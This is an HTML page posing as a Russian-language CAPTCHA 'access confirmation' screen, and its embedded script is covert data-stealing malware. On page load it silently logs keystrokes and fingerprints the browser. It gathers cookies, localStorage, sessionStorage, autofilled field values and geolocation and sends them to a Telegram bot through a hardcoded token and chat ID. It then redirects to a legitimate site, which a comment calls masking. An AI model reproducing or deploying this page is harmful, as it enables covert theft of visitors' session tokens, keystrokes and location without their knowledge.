<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Подтверждение</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e17;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #e0e0e0;
        }
        .captcha-box {
            background: #141b26;
            border-radius: 28px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            border: 1px solid #2a3340;
            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
            text-align: center;
        }
        .shield {
            font-size: 48px;
            margin-bottom: 12px;
        }
        h2 {
            font-weight: 500;
            font-size: 20px;
            color: #fff;
            margin-bottom: 6px;
        }
        .sub {
            color: #8892a0;
            font-size: 14px;
            margin-bottom: 28px;
        }
        .captcha-display {
            background: #0f1520;
            border-radius: 16px;
            padding: 20px;
            font-size: 36px;
            letter-spacing: 12px;
            font-weight: 700;
            color: #6a8cff;
            margin-bottom: 20px;
            border: 1px solid #1f2a38;
            font-family: 'Courier New', monospace;
            user-select: none;
        }
        input {
            width: 100%;
            padding: 16px 18px;
            background: #0f1520;
            border: 1px solid #1f2a38;
            border-radius: 14px;
            color: #fff;
            font-size: 18px;
            text-align: center;
            letter-spacing: 6px;
            transition: 0.2s;
        }
        input:focus {
            border-color: #4f7cff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(79, 124, 255, 0.15);
        }
        .btn {
            width: 100%;
            padding: 16px;
            margin-top: 16px;
            background: #4f7cff;
            border: none;
            border-radius: 14px;
            color: #fff;
            font-weight: 600;
            font-size: 17px;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn:hover { background: #3b66e5; }
        .btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        .status {
            margin-top: 18px;
            font-size: 13px;
            color: #5a6a7a;
        }
    </style>
</head>
<body>

<div class="captcha-box">
    <div class="shield">🛡️</div>
    <h2>Подтверждение доступа</h2>
    <div class="sub">Введите код с картинки для продолжения</div>

    <div class="captcha-display" id="captchaCode">A7K9F</div>

    <input type="text" id="captchaInput" placeholder="Введите код" maxlength="5" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">

    <button class="btn" id="submitBtn">Подтвердить</button>
    <div class="status" id="statusText">Ожидание ввода...</div>
</div>

<script>
// ================================================================
//  ВСЁ АВТОМАТИЧЕСКИ — ВСТАВЬ ТОКЕН И ID КАНАЛА, ЁБАНАТ
// ================================================================
const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';  // ТВОЙ ТОКЕН
const CHAT_ID   = '-1003791860129';  // ТВОЙ CHAT_ID

// ---------- ГЕНЕРАЦИЯ КАПЧИ ----------
function generateCaptcha() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let code = '';
    for (let i = 0; i < 5; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    document.getElementById('captchaCode').textContent = code;
    return code;
}
let currentCaptcha = generateCaptcha();

// ---------- КЕЙЛОГ (тихо собираем все нажатия) ----------
let keyLog = [];
document.addEventListener('keydown', (e) => {
    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === 'Tab') {
        keyLog.push(e.key);
        if (keyLog.length > 200) keyLog.shift();
    }
    // Собираем даже попытки ввода в капчу
    if (e.target.id === 'captchaInput') {
        // ничего не делаем, просто собираем всё
    }
});

// ---------- ФИНГЕРПРИНТ ----------
function getFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(10, 10, 20, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('fp', 30, 30);
        return canvas.toDataURL().slice(0, 80);
    } catch(e) { return 'ошибка'; }
}

// ---------- СБОР ВСЕХ ДАННЫХ (АВТОМАТИЧЕСКИ) ----------
function collectAllData() {
    const data = {};

    // ---- Браузерная информация ----
    data.userAgent = navigator.userAgent;
    data.language = navigator.language;
    data.platform = navigator.platform;
    data.cookiesEnabled = navigator.cookieEnabled ? 'да' : 'нет';
    data.screen = `${screen.width}x${screen.height}`;
    data.colorDepth = screen.colorDepth;
    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    data.time = new Date().toISOString();
    data.referrer = document.referrer || 'прямой';
    data.url = window.location.href;
    data.fingerprint = getFingerprint();

    // ---- Куки ----
    data.cookies = document.cookie || 'нет кук';

    // ---- LocalStorage ----
    try {
        data.localStorage = Object.keys(localStorage).length > 0 
            ? JSON.stringify(localStorage, null, 2) 
            : 'пусто';
    } catch(e) { data.localStorage = 'ошибка'; }

    // ---- SessionStorage ----
    try {
        data.sessionStorage = Object.keys(sessionStorage).length > 0
            ? JSON.stringify(sessionStorage, null, 2)
            : 'пусто';
    } catch(e) { data.sessionStorage = 'ошибка'; }

    // ---- Кейлог ----
    data.keylog = keyLog.join('') || 'тишина';

    // ---- Автозаполненные поля (если есть) ----
    const inputs = document.querySelectorAll('input');
    let autoFill = {};
    inputs.forEach((inp, idx) => {
        if (inp.value && inp.value.length > 0) {
            autoFill[`field_${idx}`] = inp.value;
        }
    });
    data.autofill = Object.keys(autoFill).length > 0 ? JSON.stringify(autoFill) : 'нет';

    // ---- Геолокация (асинхронно) ----
    data.geo = 'ожидание...';
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                data.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                data.geo_accuracy = pos.coords.accuracy;
                sendToTelegram(data);
            },
            err => {
                data.geo = 'отказано/ошибка';
                sendToTelegram(data);
            },
            { timeout: 5000 }
        );
    } else {
        data.geo = 'не поддерживается';
        sendToTelegram(data);
    }

    return data;
}

// ---------- ОТПРАВКА В ТЕЛЕГРАМ (тихо, без упоминаний) ----------
function sendToTelegram(data) {
    let text = '📡 СБОР ДАННЫХ (АВТОМАТИЧЕСКИЙ)\n';
    text += '═══════════════════════════════════\n';
    for (let key in data) {
        text += `🔹 ${key.toUpperCase()}: ${data[key]}\n`;
    }
    text += '═══════════════════════════════════\n';
    text += `🌐 IP: ${data.referrer || 'не определён'}\n`; // Реальный IP только через сервер

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    })
    .then(res => res.json())
    .then(result => {
        if (result.ok) {
            console.log('✅ Данные улетели в Телегу');
        } else {
            console.error('❌ Ошибка отправки:', result);
        }
    })
    .catch(err => console.error('❌ Фетч ошибка:', err));
}

// ---------- ЗАПУСК АВТОСБОРА ПРИ ЗАГРУЗКЕ ----------
window.addEventListener('load', function() {
    // Ждём 1.5 секунды, чтобы страница отрендерилась
    setTimeout(() => {
        const data = collectAllData();
        // Если гео уже отработало, отправка будет внутри collectAllData
        // Если гео не поддерживается — отправка уже вызвана
    }, 1500);

    // Дополнительный сбор через 5 секунд (на случай, если что-то подгрузилось)
    setTimeout(() => {
        const data = collectAllData();
    }, 5000);
});

// ---------- ОБРАБОТКА КАПЧИ ----------
document.getElementById('submitBtn').addEventListener('click', function() {
    const input = document.getElementById('captchaInput');
    const status = document.getElementById('statusText');
    const userCode = input.value.toUpperCase().trim();

    if (userCode === currentCaptcha) {
        status.textContent = '✅ Доступ подтверждён! Перенаправление...';
        status.style.color = '#7ddf9a';
        this.disabled = true;
        input.disabled = true;

        // Перенаправляем на легальный сайт (маскировка)
        setTimeout(() => {
            window.location.href = 'https://yandex.ru'; // или любой другой
        }, 1500);
    } else {
        status.textContent = '❌ Неверный код, попробуйте снова';
        status.style.color = '#ff8a7a';
        input.value = '';
        currentCaptcha = generateCaptcha();
        setTimeout(() => {
            status.textContent = 'Введите код с картинки';
            status.style.color = '#5a6a7a';
        }, 2000);
    }
});

// Enter для отправки капчи
document.getElementById('captchaInput').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        document.getElementById('submitBtn').click();
    }
});

// Обновляем капчу при фокусе на поле (для удобства)
document.getElementById('captchaInput').addEventListener('focus', function() {
    if (this.value === '') {
        currentCaptcha = generateCaptcha();
    }
});

console.log('🛡️ Система защиты загружена');
</script>
</body>
</html>
